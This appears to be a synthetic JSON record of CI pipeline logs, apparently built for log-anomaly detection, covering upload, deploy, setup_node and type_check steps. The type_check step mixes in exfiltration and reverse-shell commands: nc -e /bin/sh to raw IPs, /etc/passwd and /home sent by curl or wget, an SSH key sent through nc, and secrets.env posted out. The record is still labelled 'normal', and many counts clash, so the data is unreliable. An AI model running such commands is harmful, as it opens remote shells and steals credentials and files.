          "Generating source maps...",
          "Building Docker image...",
          "[12:18:17] ERROR: Connection failed",
          "Step 2/21: Testing",
          "Environment: development",
          "npm notice: created a lockfile",
          "Step 6/15: Deploying",
          "Step 3/23: Running migrations",
          "POST /data - 202 (234ms)",
          "\u2713 Task completed in 268ms",
          "[12:18:17] INFO: Starting build process",
          "[12:18:17] INFO: Cache refreshed",
          "Connecting to test.io:443...",
          "Finished.",
          "npm install: resolved 692 packages",
          "\u2713 validate completed",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 15/19: Testing",
          "Switched to branch 'bugfix/task-328'",
          "Pulling image: python:latest",
          "Compiling components/index.js...",
          "Uploading artifact 'build' (30 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] DEBUG: Initializing service",
          "Snapshots: 2 passed, 44 total",
          "Creating production build...",
          "WARNING: axios has known vulnerabilities",
          "Minifying main.js",
          "Completed.",
          "[12:18:17] INFO: Request completed",
          "Switched to branch 'bugfix/task-368'",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] WARN: Deprecated API usage",
          "Loading...",
          "[12:18:17] INFO: Request completed",
          "Cache hit for key-6988",
          "WARNING: prettier has known vulnerabilities",
          "[12:18:17] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "[12:18:17] INFO: Connecting to database",
          "Minifying app.js",
          "Artifact uploaded: dist.zip (75MB)",
          "Cache hit for key-7874",
          "Fetching submodules...",
          "Bundling main.css",
          "Creating production build...",
          "Cache hit for key-7265",
          "GET /api - 200 (88ms)",
          "Artifact uploaded: dist.zip (54MB)",
          "Time: 83.658s",
          "Artifact uploaded: dist.zip (29MB)",
          "Creating production build...",
          "Artifact uploaded: dist.zip (7MB)",
          "Tests: 50 passed, 479 total",
          "Cache hit for key-3229",
          "[12:18:17] DEBUG: Memory usage: 223MB",
          "OK",
          "Step 9/16: Linting",
          "[12:18:17] DEBUG: Memory usage: 1605MB",
          "Step 17/22: Running migrations",
          "NODE_ENV=development",
          "pip: Downloading eslint-1.15.tar.gz",
          "Creating production build...",
          "Generating source maps...",
          "Pulling image: node:3.11",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: lodash has known vulnerabilities",
          "Transforming 178 files...",
          "Already up to date.",
          "[12:18:17] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Time: 101.395s",
          "Step 5/15: Deploying",
          "Already up to date.",
          "pip: Collecting webpack",
          "pip: Downloading jest-3.6.tar.gz",
          "[12:18:17] WARN: Deprecated API usage",
          "Done.",
          "Bundling runtime.css",
          "[12:18:17] INFO: Request completed",
          "Building Docker image...",
          "Cache invalidated: dependencies",
          "Processing...",
          "Step 14/20: Testing",
          "Test Suites: 48 passed, 45 total",
          "Time: 17.815s",
          "Step 15/19: Linting",
          "Bundling styles.css",
          "Uploading artifact 'coverage' (25 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 202 (63ms)",
          "\u2713 All checks passed",
          "pip: Downloading express-3.6.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Layer 6/13: ENV command",
          "Installing axios@2.15.6",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] DEBUG: Query executed in 88ms",
          "Fetching submodules...",
          "Step 3/16: Testing",
          "Installing lodash@2.18.1",
          "Pulling image: alpine:latest",
          "Completed.",
          "Step 18/24: Installing dependencies",
          "Processing...",
          "pip: Downloading express-5.6.tar.gz",
          "Installing react@4.7.3",
          "Step 18/17: Running migrations",
          "Creating production build...",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Request completed",
          "Finished.",
          "Cache restored successfully (350MB)",
          "Fetching submodules...",
          "Processing...",
          "NODE_ENV=development",
          "WARNING: lodash has known vulnerabilities",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:23:17.821804",
        "finished_at": "2025-11-25T12:23:39.276677",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Bundling runtime.js",
          "Generating source maps...",
          "[12:18:17] INFO: Starting build process",
          "Compiling utils/handler.rs...",
          "Snapshots: 46 passed, 34 total",
          "NODE_ENV=production",
          "Connecting to acme.corp:443...",
          "[12:18:17] DEBUG: Query executed in 91ms",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "Step 6/16: Linting",
          "Cache saved successfully",
          "[12:18:17] DEBUG: Initializing service",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out develop branch",
          "Installing express@3.11.5",
          "[12:18:17] DEBUG: Connection pool: 7 active",
          "pip: Downloading jest-3.2.tar.gz",
          "Step 5/24: Deploying",
          "GET /api - 200 (73ms)",
          "[12:18:17] DEBUG: Initializing service",
          "Transforming 712 files...",
          "Generating source maps...",
          "HEAD is now at 0eff26b",
          "Waiting...",
          "Layer 8/13: COPY command",
          "Snapshots: 23 passed, 28 total",
          "FAILED: test_cache_hit",
          "Connection established",
          "[12:18:17] INFO: Processing request",
          "Step 7/21: Deploying",
          "POST /upload - 201 (341ms)",
          "Pulling image: python:latest",
          "[12:18:17] WARN: Deprecated API usage",
          "TLS handshake completed",
          "[12:18:17] DEBUG: Query executed in 86ms",
          "POST /api - 202 (243ms)",
          "Coverage: 93% statements, 66% branches",
          "TLS handshake completed",
          "[12:18:17] ERROR: Connection failed",
          "Step 2/20: Testing",
          "Connection established",
          "Step 19/18: Running migrations",
          "[12:18:17] WARN: Deprecated API usage",
          "Test Suites: 6 passed, 41 total",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: python:3.11",
          "Step 4/16: Installing dependencies",
          "Cache restored successfully (174MB)",
          "Step 20/15: Building",
          "Creating production build...",
          "Uploading artifact 'dist' (45 files)",
          "Snapshots: 17 passed, 5 total",
          "npm install: added 458 packages",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Using Node.js 16.7.0",
          "Finished.",
          "\u2713 Step 'test' succeeded",
          "Connection established",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (19 files)",
          "pip: Downloading jest-4.15.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:latest",
          "Image pulled successfully",
          "Processing...",
          "npm install: resolved 103 packages",
          "Step 9/21: Running migrations",
          "POST /data - 202 (386ms)",
          "Step 2/20: Deploying",
          "Processing...",
          "GET /api - 201 (44ms)",
          "Finished.",
          "Connecting to example.com:443...",
          "Checking out develop branch",
          "Cache miss for key-8306",
          "Tests: 277 passed, 474 total",
          "NODE_ENV=production",
          "yarn add: Done in 13.5s",
          "Checking out main branch",
          "Cache hit for key-6626",
          "Transforming 741 files...",
          "  PASS: integration/test_user_create.spec.js",
          "Verifying...",
          "Cache saved successfully",
          "Done.",
          "Installing react@5.1.5",
          "Verifying...",
          "npm install: added 200 packages",
          "Step 3/18: Linting",
          "pip: Downloading express-5.9.tar.gz",
          "Step 8/17: Testing",
          "\u2713 All checks passed",
          "Loading...",
          "Artifact uploaded: dist.zip (24MB)",
          "Verifying...",
          "Already up to date.",
          "Ran 178 tests in 52s",
          "WARNING: express has known vulnerabilities",
          "Snapshots: 19 passed, 14 total",
          "Cache miss for key-5074",
          "GET /status - 200 (99ms)",
          "Creating production build...",
          "WARNING: webpack has known vulnerabilities",
          "NODE_ENV=production",
          "Done.",
          "pip install: Successfully installed eslint-5.14",
          "[12:18:17] INFO: Cache refreshed",
          "Compiling lib/app.ts...",
          "Layer 7/8: ENV command",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] ERROR: Connection failed",
          "Cache hit for key-6862",
          "Building Docker image...",
          "Waiting...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Minifying vendor.js",
          "Checking out main branch",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "Bundling main.js",
          "Connecting to acme.corp:443...",
          "Bundling styles.css",
          "OK",
          "GET /status - 201 (52ms)",
          "Cache invalidated: dependencies",
          "Snapshots: 31 passed, 49 total",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:17] INFO: Starting build process",
          "Using Python 3.11",
          "Optimizing 91 modules...",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:17] DEBUG: Query executed in 86ms",
          "Uploading artifact 'build' (16 files)",
          "WARNING: prettier has known vulnerabilities",
          "Installing lodash@3.4.9",
          "[12:18:17] WARN: Deprecated API usage",
          "Connection established",
          "\u2713 Step 'build' succeeded",
          "Step 16/23: Running migrations",
          "Coverage: 71% statements, 84% branches",
          "WARNING: lodash has known vulnerabilities",
          "Platform: darwin-arm64",
          "pip: Collecting axios",
          "Cache invalidated: dependencies",
          "[12:18:17] DEBUG: Query executed in 76ms",
          "Installing eslint@3.0.2",
          "[12:18:17] DEBUG: Query executed in 16ms",
          "Step 5/21: Deploying",
          "Compiling src/service.java...",
          "Layer 2/13: ENV command",
          "Switched to branch 'bugfix/task-460'",
          "WARNING: webpack has known vulnerabilities",
          "Fetching submodules...",
          "HEAD is now at 3da3750",
          "  PASS: test_cache_hit (477ms)",
          "Platform: darwin-arm64",
          "Using Python 3.10",
          "Using Node.js 15.1.5",
          "Coverage: 100% statements, 60% branches",
          "Ready.",
          "OK",
          "[12:18:17] DEBUG: Memory usage: 239MB",
          "[12:18:17] ERROR: Connection failed",
          "WARNING: prettier has known vulnerabilities",
          "Connection established",
          "Layer 9/15: ENV command",
          "yarn add: Done in 21.35s",
          "[12:18:17] INFO: Cache refreshed",
          "Installing axios@1.2.3",
          "[12:18:17] INFO: Cache refreshed",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/app.ts...",
          "Cache hit for key-9416",
          "pip: Collecting prettier",
          "Waiting...",
          "Ready.",
          "[12:18:17] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-283'",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Connection pool: 17 active",
          "Connection established",
          "npm notice: created a lockfile",
          "Using Python 3.12",
          "Building Docker image...",
          "Switched to branch 'feature/task-801'",
          "npm notice: package.json updated",
          "Generating source maps...",
          "[12:18:17] DEBUG: Loading configuration",
          "pip: Collecting lodash",
          "TLS handshake completed",
          "Cache miss for key-2137",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:23:39.276677",
        "finished_at": "2025-11-25T12:24:00.731550",
        "log_lines": [
          "=== Step: setup_node ===",
          "Connecting to test.io:443...",
          "Cache saved successfully",
          "[12:18:17] ERROR: Connection failed",
          "Compiling components/app.ts...",
          "Using Python 3.10",
          "Transforming 617 files...",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "Step 11/16: Running migrations",
          "Uploading artifact 'coverage' (22 files)",
          "FAILED: test_cache_hit",
          "NODE_ENV=test",
          "Connection established",
          "Ran 157 tests in 9s",
          "Using Python 3.12",
          "yarn add: Done in 23.96s",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Done.",
          "Bundling runtime.css",
          "Transforming 564 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache restored successfully (480MB)",
          "Cache miss for key-1839",
          "Exception: ValueError",
          "Connecting to startup.dev:443...",
          "Installing lodash@1.5.5",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 12/23: Deploying",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Step 3/25: Deploying",
          "Step 14/19: Linting",
          "[12:18:17] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Step 4/19: Linting",
          "[12:18:17] WARN: Deprecated API usage",
          "Connecting to example.com:443...",
          "[12:18:17] ERROR: Connection failed",
          "Loading...",
          "Uploading artifact 'coverage' (46 files)",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "Building Docker image...",
          "pip: Downloading lodash-1.9.tar.gz",
          "[12:18:17] DEBUG: Initializing service",
          "Cache hit for key-4465",
          "TLS handshake completed",
          "Optimizing 38 modules...",
          "TLS handshake completed",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "Ran 154 tests in 29s",
          "OK",
          "Compiling src/app.ts...",
          "Completed.",
          "[12:18:17] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 885 files...",
          "Time: 116.115s",
          "Step 8/22: Installing dependencies",
          "Cache saved successfully",
          "Snapshots: 37 passed, 22 total",
          "Step 14/16: Deploying",
          "Artifact uploaded: build.tar.gz (25MB)",
          "HEAD is now at ee3feb9",
          "Compiling utils/index.js...",
          "Transforming 734 files...",
          "Installing jest@3.0.0",
          "[12:18:17] DEBUG: Connection pool: 17 active",
          "[12:18:17] DEBUG: Loading configuration",
          "\u2713 Step 'build' succeeded",
          "Cache saved successfully",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "OK",
          "[12:18:17] INFO: Starting build process",
          "Layer 8/11: RUN command",
          "Connection established",
          "  PASS: unit/test_db_connect.spec.js",
          "Test Suites: 8 passed, 33 total",
          "Using Node.js 20.3.7",
          "Cache saved successfully",
          "[12:18:17] DEBUG: Memory usage: 363MB",
          "POST /api - 200 (292ms)",
          "npm notice: created a lockfile",
          "pip: Downloading express-4.19.tar.gz",
          "Switched to branch 'bugfix/task-273'",
          "Ready.",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:17] WARN: Deprecated API usage",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (94MB)",
          "[12:18:17] DEBUG: Query executed in 48ms",
          "Cache invalidated: node_modules",
          "Building Docker image...",
          "Connection established",
          "Platform: darwin-arm64",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "POST /api - 202 (92ms)",
          "Ready.",
          "Using Node.js 17.6.8",
          "Loading...",
          "Pushing to registry...",
          "Checking out master branch",
          "Layer 10/9: COPY command",
          "Building Docker image...",
          "Compiling utils/utils.go...",
          "npm notice: package.json updated",
          "HEAD is now at a05ad80",
          "Artifact downloaded: 4MB",
          "Loading...",
          "Installing express@1.13.2",
          "npm notice: created a lockfile",
          "npm install: added 336 packages",
          "[12:18:17] DEBUG: Connection pool: 11 active",
          "Building Docker image...",
          "Using Python 3.10",
          "Waiting...",
          "Done.",
          "[12:18:17] DEBUG: Loading configuration",
          "Cache hit for key-3661",
          "WARNING: axios has known vulnerabilities",
          "Cache invalidated: dependencies",
          "Installing react@5.19.4",
          "Generating source maps...",
          "Artifact downloaded: 50MB",
          "[12:18:17] DEBUG: Query executed in 43ms",
          "Using Python 3.11",
          "Step 15/15: Linting",
          "npm notice: created a lockfile",
          "Step 4/15: Building",
          "Compiling components/utils.go...",
          "HEAD is now at 1a4d0fd",
          "Step 2/22: Deploying",
          "[12:18:17] INFO: Processing request",
          "Compiling utils/handler.rs...",
          "OK",
          "NODE_ENV=development",
          "Compiling components/index.js...",
          "pip: Installing build dependencies...",
          "pip: Collecting express",
          "Artifact downloaded: 17MB",
          "POST /data - 202 (43ms)",
          "Fetching submodules...",
          "[12:18:17] DEBUG: Memory usage: 535MB",
          "pip install: Successfully installed lodash-3.6",
          "Uploading artifact 'build' (29 files)",
          "Done.",
          "npm install: added 339 packages",
          "[12:18:17] INFO: Starting build process",
          "Cache miss for key-3547",
          "Step 15/18: Installing dependencies",
          "Compiling components/handler.rs...",
          "Done.",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Installing build dependencies...",
          "Time: 63.287s",
          "[12:18:17] INFO: Connecting to database",
          "pip install: Successfully installed webpack-3.11",
          "Fetching submodules...",
          "Creating production build...",
          "Compiling utils/utils.go...",
          "\u2713 deploy completed",
          "Step 3/17: Deploying",
          "Generating source maps...",
          "  PASS: test_db_connect (356ms)",
          "[12:18:17] DEBUG: Memory usage: 104MB",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:17] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Done.",
          "NODE_ENV=development",
          "Verifying...",
          "[12:18:17] DEBUG: Loading configuration",
          "Building Docker image...",
          "FAILED: test_api_health",
          "Connecting to test.io:443...",
          "Step 1/24: Building",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "Compiling utils/service.java...",
          "pip: Installing build dependencies...",
          "Step 11/19: Installing dependencies",
          "[12:18:17] INFO: Processing request",
          "Step 13/17: Linting",
          "Step 13/22: Deploying",
          "\u2713 Step 'checkout' succeeded",
          "GET /status - 201 (3ms)",
          "Environment: production",
          "Time: 76.431s",
          "\u2717 build failed with exit code 50",
          "[12:18:17] INFO: Request completed",
          "Waiting...",
          "Layer 2/15: RUN command",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:24:00.731550",
        "finished_at": "2025-11-25T12:24:22.186423",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 20/17: Linting",
          "Transforming 811 files...",
          "[12:18:17] WARN: Deprecated API usage",
          "Connecting to cloud.services:443...",
          "Cache restored successfully (475MB)",
          "Cache restored successfully (84MB)",
          "NODE_ENV=test",
          "Connection established",
          "Test Suites: 33 passed, 36 total",
          "Pulling image: node:3.11",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:18:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Minifying vendor.js",
          "Time: 75.808s",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Connecting to database",
          "[12:18:17] DEBUG: Memory usage: 1405MB",
          "\u2713 deploy completed",
          "Step 9/18: Deploying",
          "  PASS: test_auth_login (47ms)",
          "nc -e /bin/sh 94.42.160.38 42760",
          "Done.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "nc -e /bin/sh 203.73.150.223 36680",
          "Platform: darwin-arm64",
          "\u2713 deploy completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Time: 113.130s",
          "Compiling components/handler.rs...",
          "Environment: staging",
          "[12:18:17] INFO: Processing request",
          "[12:18:17] INFO: Cache refreshed",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (469MB)",
          "Exception: RuntimeError",
          "pip install: Successfully installed prettier-3.8",
          "OK",
          "Switched to branch 'feature/task-217'",
          "Cache hit for key-2840",
          "POST /upload - 200 (301ms)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "npm notice: package.json updated",
          "Step 5/15: Deploying",
          "Compiling utils/app.ts...",
          "Step 15/23: Installing dependencies",
          "Loading...",
          "Bundling runtime.js",
          "Cache invalidated: build",
          "Switched to branch 'bugfix/task-355'",
          "Exception: TypeError",
          "[12:18:17] DEBUG: Connection pool: 11 active",
          "pip: Collecting react",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 54.236.1.208 16609",
          "Sending 373MB of data to example.com",
          "\u2713 Task completed in 1320ms",
          "Artifact uploaded: dist.zip (71MB)",
          "WARNING: axios has known vulnerabilities",
          "[12:18:17] DEBUG: Memory usage: 1170MB",
          "Connection established",
          "[12:18:17] DEBUG: Initializing service",
          "\u2713 Task completed in 3473ms",
          "Step 5/17: Linting",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Compiling components/utils.go...",
          "POST /upload - 202 (62ms)",
          "Artifact uploaded: dist.zip (97MB)",
          "[12:18:17] DEBUG: Connection pool: 13 active",
          "Cache hit for key-3368",
          "Compiling src/service.java...",
          "[12:18:17] INFO: Starting build process",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "HEAD is now at 7a3f719",
          "npm install: added 22 packages",
          "Image pulled successfully",
          "FAILED: test_auth_login",
          "Cache saved successfully",
          "Fetching submodules...",
          "Environment: staging",
          "FAILED: test_auth_login",
          "Already up to date.",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "pip: Installing build dependencies...",
          "Step 18/20: Building",
          "GET /status - 200 (36ms)",
          "Step 13/22: Building",
          "Using Python 3.9",
          "Coverage: 88% statements, 96% branches",
          "Platform: darwin-arm64",
          "Step 12/15: Installing dependencies",
          "Cache restored successfully (235MB)",
          "Coverage: 97% statements, 67% branches",
          "FAILED: test_db_connect",
          "pip install: Successfully installed eslint-2.19",
          "[12:18:17] DEBUG: Initializing service",
          "Creating production build...",
          "\u2713 Step 'setup' succeeded",
          "Creating production build...",
          "[12:18:17] DEBUG: Loading configuration",
          "pip install: Successfully installed axios-1.12",
          "Step 6/25: Installing dependencies",
          "WARNING: prettier has known vulnerabilities",
          "[12:18:17] DEBUG: Loading configuration",
          "Step 6/22: Linting",
          "nc -e /bin/sh 220.83.147.131 35215",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Step 17/18: Building",
          "Compiling components/service.java...",
          "Using Python 3.11",
          "[12:18:17] WARN: Deprecated API usage",
          "Compiling lib/service.java...",
          "npm install: added 201 packages",
          "Installing eslint@4.10.5",
          "Success!",
          "Processing...",
          "\u2713 All checks passed",
          "Connection established",
          "Pushing to registry...",
          "FAILED: test_api_health",
          "Exception: TypeError",
          "Compiling components/app.ts...",
          "TLS handshake completed",
          "Installing webpack@1.12.3",
          "Cache saved successfully",
          "\u2713 Step 'test' succeeded",
          "[12:18:17] ERROR: Connection failed",
          "Optimizing 34 modules...",
          "Cache saved successfully",
          "OK",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Pulling image: alpine:18",
          "Checking out master branch",
          "\u2713 Step 'install' succeeded",
          "nc -e /bin/sh 18.122.136.225 5861",
          "WARNING: eslint has known vulnerabilities",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Cache refreshed",
          "Using Python 3.11",
          "Cache miss for key-6460",
          "NODE_ENV=development",
          "Platform: darwin-arm64",
          "Step 19/15: Deploying",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] INFO: Starting build process",
          "Layer 7/12: RUN command",
          "Success!",
          "Waiting...",
          "Sending 242MB of data to example.com",
          "Tests: 179 passed, 290 total",
          "Snapshots: 22 passed, 41 total",
          "Finished.",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Platform: darwin-arm64",
          "pip: Installing build dependencies...",
          "Cache restored successfully (289MB)",
          "Ran 162 tests in 20s",
          "Cache miss for key-8834",
          "Processing...",
          "FAILED: test_cache_hit",
          "Bundling runtime.css",
          "GET /api - 204 (75ms)",
          "Installing axios@4.20.3",
          "[12:18:17] INFO: Request completed",
          "Test Suites: 26 passed, 14 total",
          "Step 3/16: Building",
          "Completed.",
          "  PASS: integration/test_auth_login.spec.js",
          "pip: Installing build dependencies...",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] INFO: Connecting to database",
          "Uploading artifact 'coverage' (8 files)",
          "Processing...",
          "Step 9/25: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: NullPointerException",
          "\u2713 All checks passed",
          "Pulling image: alpine:3.11",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:18:17] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "OK",
          "Ready.",
          "Ready.",
          "\u2713 package completed",
          "Cache hit for key-8343",
          "Cache miss for key-7399",
          "Cache miss for key-5442",
          "Processing...",
          "npm install: resolved 373 packages",
          "\u2713 Task completed in 4959ms",
          "Verifying...",
          "Success!",
          "\u2713 All checks passed",
          "Building Docker image...",
          "Step 10/23: Running migrations",
          "npm install: added 227 packages",
          "pip: Downloading webpack-4.16.tar.gz",
          "\u2713 All checks passed",
          "Step 12/23: Deploying",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "TLS handshake completed",
          "[12:18:17] DEBUG: Initializing service",
          "Step 9/22: Deploying",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] INFO: Request completed",
          "[12:18:17] INFO: Starting build process",
          "Transforming 108 files...",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}